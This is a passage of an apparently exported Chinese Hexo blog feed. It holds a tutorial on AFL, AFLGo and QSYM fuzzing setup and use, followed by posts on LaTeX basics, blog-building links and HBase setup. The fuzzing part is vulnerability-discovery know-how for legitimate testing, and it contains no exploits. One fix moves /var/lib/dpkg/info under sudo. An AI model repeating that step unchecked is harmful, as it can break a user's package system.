<h2 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h2><p>1) 从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）；<br>2) 选择一些输入文件，作为初始测试集加入输入队列（queue）；<br>3) 将队列中的文件按一定的策略进行“突变”；<br>4) 如果经过变异文件更新了覆盖范围，则将其保留添加到队列中;<br>5) 上述过程会一直循环进行，期间触发了crash的文件会被记录下来。<br><img src="/images/fuzzing-basic/01.jpg" alt="pic01"><br>图片来源与文献[5]</p>
<h2 id="AFL组成"><a href="#AFL组成" class="headerlink" title="AFL组成"></a>AFL组成</h2><p>总共三个部分组成[6]。</p>
<ul>
<li>编译器wrapper<blockquote>
<p>对开源软件编译，编译过程中插入一些AFL识别的函数用以识别探索路径，AFL的编译工具为afl-gcc/afl-g++,afl-clang等。</p>
</blockquote>
</li>
<li>测试器fuzzer<blockquote>
<p>afl-fuzz是AFL重要的主体，用以对软件进行fuzzing。</p>
</blockquote>
</li>
<li>辅助工具<blockquote>
<p>afl-cmin，afl-tmin等，为提升测试的效率和成功率而服务。</p>
</blockquote>
</li>
</ul>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><a href="http://lcamtuf.coredump.cx/afl/" target="_blank" rel="noopener">afl-fuzz官网</a></p>
<blockquote>
<p>环境：ubuntu16.04， afl-2.52b</p>
</blockquote>
<ul>
<li><p>step1: 下载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http://lcamtuf.coredump.cx/afl/releases/afl-2.52b.tgz</span><br></pre></td></tr></table></figure>
</li>
<li><p>step2: make</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd afl-2.52b</span><br><span class="line">make</span><br><span class="line">sudo  make install</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>在命令行中输入<code>afl-</code>，然后使用tab建，可以看到命令提示，表示安装成功。或者<code>afl-fuzz</code>可以看到提示信息。</p>
<h2 id="AFL基本使用"><a href="#AFL基本使用" class="headerlink" title="AFL基本使用"></a>AFL基本使用</h2><h3 id="测试程序"><a href="#测试程序" class="headerlink" title="测试程序"></a>测试程序</h3><p>见参考文献[4]</p>
<h3 id="插桩编译"><a href="#插桩编译" class="headerlink" title="插桩编译"></a>插桩编译</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">afl-gcc -g -o test test.c</span><br></pre></td></tr></table></figure>

<p>对于其它的编译选项，如make，makefile等编译过程详见参考文献[4]。</p>
<h3 id="开始fuzzing"><a href="#开始fuzzing" class="headerlink" title="开始fuzzing"></a>开始fuzzing</h3><p>建立一个文件夹<code>fuzz_in</code>，里面放入一些文本文件<br>fuzzing命令的格式:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">afl-fuzz -i testcase_dir -o findings_dir /path/to/program […params…]</span><br><span class="line">afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</span><br></pre></td></tr></table></figure>

<p>常见参数的含义：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-f: 参数表示：testcase的内容会作为afl_test的stdin</span><br><span class="line">-m: 参数表示分配的内存空间</span><br><span class="line">-i: 指定测试样本的路径</span><br><span class="line">-o: 指定输出结果的路径</span><br><span class="line">/dev/null: 使错误信息不输出到屏幕</span><br><span class="line">-t：设置程序运行超时值，单位为 ms</span><br><span class="line">-M：运行主(Master) Fuzzer</span><br><span class="line">-S：运行从属(Slave) Fuzzer</span><br></pre></td></tr></table></figure>

<p>一个示例：<code>afl-fuzz -m 300 -i fuzz_in -o  fuzz_out ./test -f</code></p>
<blockquote>
<p>注意，要在目标程序前加上./，否则会报错误。</p>
</blockquote>
<p>成功之后的界面如下：<br><img src="/images/fuzzing-basic/02.png" alt="pic01"></p>
<p>界面分析信息的<a href="http://lcamtuf.coredump.cx/afl/status_screen.txt" target="_blank" rel="noopener">官方参考文档</a>，或者文献[7]<br>一些主要的信息需要注意：</p>
<blockquote>
<ul>
<li>last new path 目标二进制文件或者命令行参数出错，那么其执行路径应该是一直不变的。</li>
<li>cycles done 如果变绿就说明后面即使继续fuzz，出现crash的几率也很低，可以选择在这个时候停止</li>
<li>uniq crashes 代表的是crash的数量</li>
<li>stage progress 正在测试的fuzzing策略、进度、目标的执行总次数、目标的执行速度，如低于500次每秒，那么测试时间就会变得非常漫长。如果发生了这种情况，那么我们需要进一步调整优化我们的fuzzing。</li>
</ul>
</blockquote>
<h3 id="查看crash"><a href="#查看crash" class="headerlink" title="查看crash"></a>查看crash</h3><p>进入设定的输出文件夹，如fuzz_out/crashes。<br>然后复制crash信息，使用命令<code>xxd id:000000,sig:11,src:000001,op:havoc,rep:4</code></p>
<h1 id="0x02-AFLGo"><a href="#0x02-AFLGo" class="headerlink" title="0x02 AFLGo"></a>0x02 AFLGo</h1><h2 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h2><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p><a href="https://github.com/aflgo/aflgo" target="_blank" rel="noopener">官网安装教程</a><br>几点说明：<br>1) 对于官网步骤1：安装<code>llvm</code>环境请看该<a href="https://www.jianshu.com/p/49261b1a50c4" target="_blank" rel="noopener">llvm安装教程</a>，选择<code>llvm6.0.0</code>源码下载（这里有6个软件包需要下载安装）。</p>
<h3 id="报错处理"><a href="#报错处理" class="headerlink" title="报错处理"></a>报错处理</h3><p>我安装make的时候出现如下错误<br><img src="/images/fuzzing-basic/03.png" alt="pic01"><br>此时执行下面的命令就可以可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mv /var/lib/dpkg/info/ /var/lib/dpkg/info_old/</span><br><span class="line">$ sudo mkdir /var/lib/dpkg/info/</span><br><span class="line">$ sudo apt-get update</span><br></pre></td></tr></table></figure>

<p>下面这个链接展示了如下在一个<strong>真实开源软件</strong>上进行AFL fuzzing<br><a href="https://github.com/lcatro/Fuzzing-ImageMagick/blob/master/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Fuzzing%E6%8C%96%E6%8E%98ImageMagick%E7%9A%84%E6%BC%8F%E6%B4%9E.md" target="_blank" rel="noopener">AFL挖掘ImageMagick漏洞</a></p>
<h1 id="0x03-qysm"><a href="#0x03-qysm" class="headerlink" title="0x03 qysm"></a>0x03 qysm</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><a href="https://www.usenix.org/node/217566" target="_blank" rel="noopener">参考论文</a><br>论文摘要</p>
<blockquote>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近，有人提出混合模糊方法来解决模糊和协同执行的局限性。这种混合方法已经在各种综合基准测试中显示出了它的有效性，例如DARPA的网络大挑战(CGC)二进制文件，但是它仍然需要在复杂的、真实世界的软件中寻找缺陷。我们观察到，现有共扼执行器的性能瓶颈是其在小规模研究之外被采用的主要限制因素。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了克服这一问题，我们设计了一个快速的协同执行引擎，称为QSYM，以支持混合模糊。关键思想是使用动态二进制转换将符号模拟与本机执行紧密集成，从而实现更细粒度、更快的指令级符号模拟。此外，QSYM放宽了传统concolic执行者对更好性能的严格可靠性要求，同时利用了一个更快的fuzzer进行验证，为性能优化提供了前所未有的机会，例如，优化地解决约束和修剪无兴趣的基本块。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们的评估表明，QSYM不仅优于最先进的fuzzers(即bug,发现14×超过VUzzer LAVA-M数据集,钻地,比126年104的二进制文件),但也发现了13个未知安全漏洞在Dropbox轻子等八个实际项目,ffmpeg, OpenJPEG,那些已经被集中测试的最先进的fuzz, AFL OSS-Fuzz。</p>
</blockquote>
<h2 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h2><p>有一个github开源库<a href="https://github.com/sslab-gatech/qsym" target="_blank" rel="noopener">地址</a><br>该开源库中提供了安装方法</p>
<p>遇到了一个错误，再使用<code>virtualenv venv</code>命令地时候<br><img src="/images/fuzzing-basic/04.png" alt="pic01"></p>
<blockquote>
<p>错误原因，系统地python环境是2.7，需要使用python3.5+版本python。</p>
</blockquote>
<p>解决方法：指定python3，使用命令<code>virtualenv -p  /usr/bin/python venv</code>。这个python指向的是python3。更多virtulenv的用法见参考文献[8]</p>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="https://github.com/secfigo/Awesome-Fuzzing" target="_blank" rel="noopener">https://github.com/secfigo/Awesome-Fuzzing</a><br>[2] <a href="https://github.com/firmianay/CTF-All-In-One/blob/master/doc/5.1_fuzzing.md" target="_blank" rel="noopener">https://github.com/firmianay/CTF-All-In-One/blob/master/doc/5.1_fuzzing.md</a><br>[3] <a href="https://zhuanlan.zhihu.com/p/43432370" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/43432370</a> fuzzing技术总结<br>[4] <a href="http://zeroyu.xyz/2019/05/15/how-to-use-afl-fuzz/" target="_blank" rel="noopener">http://zeroyu.xyz/2019/05/15/how-to-use-afl-fuzz/</a> afl使用指南<br>[5] <a href="https://www.freebuf.com/articles/system/191536.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/191536.html</a> AFL漏洞挖掘技术漫谈<br>[6] <a href="https://fly8wo.github.io/2018/09/21/AFL-Fuzz%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%89%E8%A3%85%E4%B8%8E%E7%BC%96%E8%AF%91/" target="_blank" rel="noopener">https://fly8wo.github.io/2018/09/21/AFL-Fuzz%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%89%E8%A3%85%E4%B8%8E%E7%BC%96%E8%AF%91/</a> 简单安装和编译<br>[7] <a href="https://xz.aliyun.com/t/4314" target="_blank" rel="noopener">https://xz.aliyun.com/t/4314</a>  fuzzing简单测试<br>[8] <a href="https://blog.csdn.net/weixin_37773766/article/details/80773590" target="_blank" rel="noopener">https://blog.csdn.net/weixin_37773766/article/details/80773590</a> virtualenv简单介绍</p>
]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>fuzzing</tag>
        <tag>AFL</tag>
      </tags>
  </entry>
  <entry>
    <title>latex-basic</title>
    <url>/2019/11/29/latex-basic/</url>
    <content><![CDATA[<p>latex学习记录</p>
<a id="more"></a>
<h1 id="0x00-学习环境"><a href="#0x00-学习环境" class="headerlink" title="0x00 学习环境"></a>0x00 学习环境</h1><p>使用<a href="https://www.overleaf.com/" target="_blank" rel="noopener">overleaf</a>环境。</p>
<h2 id="中文支持"><a href="#中文支持" class="headerlink" title="中文支持"></a>中文支持</h2><p>两步操作<br>1) menu –&gt;  settings –&gt; compile —&gt; 选择XelaTex<br>2) 添加如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\documentclass&#123;article&#125;</span><br><span class="line">\usepackage[UTF8]&#123;ctex&#125;</span><br></pre></td></tr></table></figure>

<h2 id="一个简单的结构如下"><a href="#一个简单的结构如下" class="headerlink" title="一个简单的结构如下"></a>一个简单的结构如下</h2><p>在<code>\documentclass</code>与<code>\begin{document}</code>之间为导言区，设置真篇文档，一般设置页面大小，页眉页脚样式，章节标题样式。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\documentclass&#123;article&#125;</span><br><span class="line">\usepackage[UTF8]&#123;ctex&#125;</span><br><span class="line">\begin&#123;document&#125;</span><br><span class="line">main text1中文</span><br><span class="line">\end&#123;document&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x01基本命令"><a href="#0x01基本命令" class="headerlink" title="0x01基本命令"></a>0x01基本命令</h1><h2 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h2><p>以反斜线开头，一般有一下两种格式的命令</p>
<ul>
<li>无参数<br><code>\command</code><br>eg: \songti 我爱latex</li>
<li>有参数<br><code>\command [可选参数]{必选参数}</code></li>
</ul>
<h2 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h2><table>
 <tr><th>命令</th><th>功能</th></tr>
 <tr><td>\chapter</td><td>章</td></tr>
 <tr><td>\section</td><td>节</td></tr>
 <tr><td>\subsection</td><td>小节</td></tr>
 <tr><td>\paragraph</td><td>带题头段落</td></tr>
 <tr><td>\centering</td><td>居中对齐</td></tr>
 <tr><td>\chapter</td><td>章</td></tr>
 <tr><td>\paragraph</td><td>带题头段落</td></tr>
 <tr><td>\centering</td><td>居中对齐</td></tr>
 <tr><td>\emph</td><td>强调</td></tr>
 <tr><td>\verb</td><td>原样输出</td></tr>
 <tr><td>\url</td><td>超链接</td></tr>
 <tr><td>\footnote</td><td>脚注</td></tr>
 <tr><td>\item</td><td>列表条目</td></tr>
 <tr><td>\caption</td><td>标题</td></tr>
 <tr><td>\includegraphics</td><td>插入图片</td></tr>
 <tr><td>\label</td><td>标号</td></tr>
 <tr><td>\cite</td><td>引用参考文献</td></tr>
 <tr><td>\ref</td><td>引用图表公式等</td></tr>
</table>

<blockquote>
<p>章\chapter应用在\documentclass{book}下面，在\documentclass{article}不能使用</p>
</blockquote>
<h2 id="命令section举例"><a href="#命令section举例" class="headerlink" title="命令section举例"></a>命令section举例</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\begin&#123;document&#125;</span><br><span class="line">\section&#123;第一节&#125;</span><br><span class="line">正文</span><br><span class="line">前方高能\footnote&#123;我是注脚&#125;</span><br><span class="line">前方高能\footnote&#123;我是注脚2&#125;</span><br><span class="line">\end&#123;document&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/latex-basic/01.png" alt="pic"></p>
<h1 id="0x02-环境"><a href="#0x02-环境" class="headerlink" title="0x02 环境"></a>0x02 环境</h1><h2 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h2><p>无参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\begin&#123;environment&#125;</span><br><span class="line">环境内容</span><br><span class="line">\end&#123;environment&#125;</span><br></pre></td></tr></table></figure>

<p>有参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\begin&#123;environment&#125;[参数]</span><br><span class="line">环境内容</span><br><span class="line">\end&#123;environment&#125;</span><br></pre></td></tr></table></figure>

<h2 id="常见环境"><a href="#常见环境" class="headerlink" title="常见环境"></a>常见环境</h2><table>
 <tr><th>环境</th><th>功能</th></tr>
 <tr><td>\table</td><td>表格</td></tr>
 <tr><td>\figure</td><td>图片</td></tr>
 <tr><td>\equation</td><td>公式</td></tr>
 <tr><td>\itemize</td><td>无编号列表</td></tr>
 <tr><td>\enumerate</td><td>编号列表</td></tr>
</table>

<h2 id="环境举例"><a href="#环境举例" class="headerlink" title="环境举例"></a>环境举例</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\begin&#123;document&#125;</span><br><span class="line">\begin&#123;equation&#125;</span><br><span class="line">    a^2-b^2=(a+b)(a-b)</span><br><span class="line">\end&#123;equation&#125;</span><br><span class="line">\end&#123;document&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/latex-basic/02.png" alt="pic"></p>
<h2 id="一个简单的文章结构"><a href="#一个简单的文章结构" class="headerlink" title="一个简单的文章结构"></a>一个简单的文章结构</h2><p>latex提供了几个层次结构。<strong>注意</strong>，article中没有<code>chapter</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\documentclass&#123;article&#125;</span><br></pre></td></tr></table></figure>

<p>其它的如report和book则支持所有的层次。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\part&#123;...&#125;           %Level -1</span><br><span class="line">\chapter&#123;...&#125;        %Level 0</span><br><span class="line">\section&#123;...&#125;        %Level 1</span><br><span class="line">\subsection&#123;...&#125;     %Level 2</span><br><span class="line">\subsubsection&#123;...&#125;  %Level 3</span><br><span class="line">\paragraph&#123;...&#125;      %Level 4</span><br><span class="line">\subparagraph&#123;...&#125;   %Level 5</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\title&#123;杂谈勾股定理&#125;</span><br><span class="line">\author&#123;张三&#125;</span><br><span class="line">\date&#123;\today&#125;</span><br><span class="line"> \bibliographystyle&#123;plain&#125;</span><br><span class="line"> </span><br><span class="line">\begin&#123;document&#125;</span><br><span class="line"> \maketitle</span><br><span class="line"> \tableofcontents</span><br><span class="line"> </span><br><span class="line">\section&#123;勾股定理在古代&#125;</span><br><span class="line">\section&#123;勾股定理的近代形式&#125;</span><br><span class="line"></span><br><span class="line">\bibliography&#123;math&#125;</span><br><span class="line">\end&#123;document&#125;</span><br></pre></td></tr></table></figure>

<p>编译之后显示的文件如下：<br><img src="/images/latex-basic/03.png" alt="pic02"></p>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="https://github.com/tuna/thulib-latex-talk" target="_blank" rel="noopener">https://github.com/tuna/thulib-latex-talk</a><br>[2] <a href="https://liam.page/2014/09/08/latex-introduction/" target="_blank" rel="noopener">https://liam.page/2014/09/08/latex-introduction/</a><br>[3] <a href="https://github.com/huangxg/lnotes" target="_blank" rel="noopener">https://github.com/huangxg/lnotes</a>  雷太赫排版系统</p>
]]></content>
      <categories>
        <category>tool</category>
      </categories>
      <tags>
        <tag>latex</tag>
      </tags>
  </entry>
  <entry>
    <title>buileSite-ref</title>
    <url>/2019/11/27/buileSite-ref/</url>
    <content><![CDATA[<p>建立本站参考的文章</p>
<a id="more"></a>
<p>环境</p>
<blockquote>
<p>git<br>node.js<br>next v.7.4.0主题</p>
</blockquote>
<p>[1] <a href="http://theme-next.iissnan.com/getting-started.html" target="_blank" rel="noopener">http://theme-next.iissnan.com/getting-started.html</a><br>大致流程，命令<br>[2] <a href="https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html" target="_blank" rel="noopener">https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html</a><br>个性化配置教程<br>[3] <a href="https://leomalik.github.io/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html" target="_blank" rel="noopener">https://leomalik.github.io/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html</a></p>
<p>添加背景图片<br>[4] <a href="https://bufsnake.github.io/hexo-next-7-xx%E6%B7%BB%E5%8A%A0%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87.html" target="_blank" rel="noopener">https://bufsnake.github.io/hexo-next-7-xx%E6%B7%BB%E5%8A%A0%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87.html</a></p>
<p><a href="https://asphelzhn.github.io/2018/12/19/hexo/" target="_blank" rel="noopener">https://asphelzhn.github.io/2018/12/19/hexo/</a></p>
<p><a href="https://buptccq.top/%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.html" target="_blank" rel="noopener">https://buptccq.top/%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.html</a></p>
]]></content>
  </entry>
  <entry>
    <title>hbase-base01</title>
    <url>/2019/11/25/hbase-base01/</url>
    <content><![CDATA[<p>hbase基本知识</p>
<a id="more"></a>
<p>HBase是一个高可靠，高性能，面向列，可伸缩的分布式数据库，google的BigTable开源实现，主要用来存储非结构化和半结构化的松散数据。</p>
<blockquote>
<p>学习版本：HBase1.4</p>
</blockquote>
<p>该版本的hadoop版本要求见官网<a href="https://hbase.apache.org/book.html#basic.prerequisites" target="_blank" rel="noopener">版本要求</a><br><a href="https://hbase.apache.org/book.html#getting_started" target="_blank" rel="noopener">官方参考文档</a></p>
<h1 id="0x00下载安装"><a href="#0x00下载安装" class="headerlink" title="0x00下载安装"></a>0x00下载安装</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul>
<li>step1：从官网下载hbase-1.4.11-bin.tar.gz版本的文件。解压缩<code>tar -zxvf hba.....</code></li>
<li>step2(可选)：为了能够方便使用hbase命令，在/etc/profile中配置环境变量<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export PATH=/opt/hadoop-2.7.1/bin:/opt/hbase-1.4.11/bin:$&#123;PATH&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>使用命令<code>source /etc/profile</code>使之生效。</p>
<blockquote>
<p>环境变量配置在<code>~/.bashrc</code>中也可以。</p>
<ul>
<li>step3：如果所属用户不是root，此时还需要修改hbase文件的权限。</li>
<li>step4：通过命令<code>hbase version</code>可以验证是否安装成功，即可查看吧版本信息。<br><img src="/images/hbase-basic/01.png" alt="pic1"></li>
</ul>
</blockquote>
<h2 id="伪分布式模式配置"><a href="#伪分布式模式配置" class="headerlink" title="伪分布式模式配置"></a>伪分布式模式配置</h2><p>hbase有三种模式，单机模式使用本地文件系统存储数据，伪分布式和分布式采用HDFS存储数据。<br>参考文献[1]有具体配置方法</p>
<h3 id="配置hbase-env-sh。"><a href="#配置hbase-env-sh。" class="headerlink" title="配置hbase-env.sh。"></a>配置<code>hbase-env.sh</code>。</h3><ul>
<li>配置JAVA_HOME</li>
<li>配置HBASE_CLASSPATH<br>设置为本机hadoop安装目录下的conf目录。<br>eg:<code>export HBASE_CLASSPATH=/opt/hadoop-2.7.1/etc/hadoop</code></li>
<li>配置HBASE_MANAGES_ZK<br><code>export HBASE_MANAGES_ZK=true</code>表示hbase自己管理zookeeper，不需要单独zookeeper。</li>
</ul>
<h3 id="配置hbase-site-xml"><a href="#配置hbase-site-xml" class="headerlink" title="配置hbase-site.xml"></a>配置<code>hbase-site.xml</code></h3><p>设置<code>hbase.rootdir</code>指定HBase数据的存储位置，即在HDFS上的路径<br>设置<code>hbase.cluter.distrubuted</code>为true。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;hbase.rootdir&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;hdfs://localhost:9000/hbase&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;hbase.cluster.distributed&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;true&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>

<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>需要先保证hadoop运行，s使用<code>jps</code>查看。<br><code>bin/start-hbase.sh</code><br>停止运行<code>stop-hbase.sh</code><br>进入HBase Shell模式：<code>hbase shell</code></p>
<h1 id="0x01基本hbase-shell命令"><a href="#0x01基本hbase-shell命令" class="headerlink" title="0x01基本hbase shell命令"></a>0x01基本hbase shell命令</h1><h2 id="创建表create"><a href="#创建表create" class="headerlink" title="创建表create"></a>创建表create</h2><p>不需要创建数据库，直接建表就可，系统默认一个属性作为行键。<br>这里建一个student表，属性在后面跟随</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):001:0&gt; create &apos;student&apos;,&apos;Sname&apos;,&apos;Ssex&apos;,&apos;Sage&apos;,&apos;Sdept&apos;,&apos;course&apos;</span><br></pre></td></tr></table></figure>

<p>在创建表的过程中如果有如下错误</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ERROR: org.apache.hadoop.hbase.ipc.ServerNotRunningYetException: Server is not running yet</span><br></pre></td></tr></table></figure>

<p>可以先关闭HBase，然后在hadoop的bin目录下执行<code>hdfs dfsadmin -safemode leave</code>，重启hbase即可。</p>
<h2 id="查看表的基本信息describe"><a href="#查看表的基本信息describe" class="headerlink" title="查看表的基本信息describe"></a>查看表的基本信息describe</h2><p>使用<code>list</code>查看创建的表。<br>然后<code>describe &#39;tableName&#39;</code>查看。<br><img src="/images/hbase-basic/02.png" alt="pic1"></p>
<h2 id="添加数据put"><a href="#添加数据put" class="headerlink" title="添加数据put"></a>添加数据put</h2><p>只能一次添加一个单元格数据，默认表名后面是一个行键</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):006:0&gt; put &apos;student&apos;,&apos;2019001&apos;,&apos;Sname&apos;,&apos;YiJun&apos;</span><br></pre></td></tr></table></figure>

<p>可以继续添加其它单元格数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):007:0&gt; put &apos;student&apos;,&apos;2019001&apos;,&apos;Ssex&apos;,&apos;male&apos;</span><br></pre></td></tr></table></figure>

<h2 id="查看数据"><a href="#查看数据" class="headerlink" title="查看数据"></a>查看数据</h2><h3 id="get"><a href="#get" class="headerlink" title="get"></a>get</h3><p>这个是查看某一个键值的数据，后面跟表名，键值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):008:0&gt; get &apos;student&apos;,&apos;2019001&apos;</span><br></pre></td></tr></table></figure>

<h3 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h3><p>这个是查询某一个表的全部记录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):011:0&gt; scan &apos;student&apos;</span><br></pre></td></tr></table></figure>

<h2 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h2><h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><p>put命令的逆操作，只删除一个单元格</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):012:0&gt; delete &apos;student&apos;,&apos;2019001&apos;,&apos;Ssex&apos;</span><br></pre></td></tr></table></figure>

<h3 id="delete-all"><a href="#delete-all" class="headerlink" title="delete all"></a>delete all</h3><p>删除某一键值的全部数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hbase(main):014:0&gt; deleteall &apos;student&apos;,&apos;2019001&apos;</span><br></pre></td></tr></table></figure>

<h2 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h2><p>这个需要两步操作。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">disable &apos;student&apos;</span><br><span class="line">drop &apos;student&apos;</span><br></pre></td></tr></table></figure>

<h1 id="0x02-IDEA编程开发"><a href="#0x02-IDEA编程开发" class="headerlink" title="0x02 IDEA编程开发"></a>0x02 IDEA编程开发</h1><p>同hadoop一样，可以打包成jar包运行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hadoop jar ****.jar</span><br></pre></td></tr></table></figure>

<h2 id="在pom-xml中加入如下"><a href="#在pom-xml中加入如下" class="headerlink" title="在pom.xml中加入如下"></a>在pom.xml中加入如下</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.apache.hbase&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;hbase-client&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.4.11&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>测试如下代码，该资料来源与互联网。<br><a href="http://dblab.xmu.edu.cn/blog/1593-2/" target="_blank" rel="noopener">代码链接</a></p>
<h2 id="连接代码"><a href="#连接代码" class="headerlink" title="连接代码"></a>连接代码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">configuration  = HBaseConfiguration.create();</span><br><span class="line">configuration.set(&quot;hbase.rootdir&quot;,&quot;hdfs://localhost:9000/hbase&quot;);</span><br><span class="line">try&#123;</span><br><span class="line">    connection = ConnectionFactory.createConnection(configuration);</span><br><span class="line">    admin = connection.getAdmin();</span><br><span class="line">&#125;catch (IOException e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="关闭连接"><a href="#关闭连接" class="headerlink" title="关闭连接"></a>关闭连接</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void close()&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            if(admin != null)&#123;</span><br><span class="line">                admin.close();</span><br><span class="line">            &#125;</span><br><span class="line">            if(null != connection)&#123;</span><br><span class="line">                connection.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;catch (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="建立表"><a href="#建立表" class="headerlink" title="建立表"></a>建立表</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void createTable(String myTableName,String[] colFamily) throws IOException &#123; </span><br><span class="line">        init();</span><br><span class="line">        TableName tableName = TableName.valueOf(myTableName); </span><br><span class="line">        if(admin.tableExists(tableName))&#123;</span><br><span class="line">            System.out.println(&quot;talbe is exists!&quot;);</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            HTableDescriptor hTableDescriptor = new HTableDescriptor(tableName);</span><br><span class="line">            for(String str:colFamily)&#123;</span><br><span class="line">                HColumnDescriptor hColumnDescriptor = new HColumnDescriptor(str);</span><br><span class="line">                hTableDescriptor.addFamily(hColumnDescriptor);</span><br><span class="line">            &#125;</span><br><span class="line">            admin.createTable(hTableDescriptor);</span><br><span class="line">        &#125;</span><br><span class="line">        close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

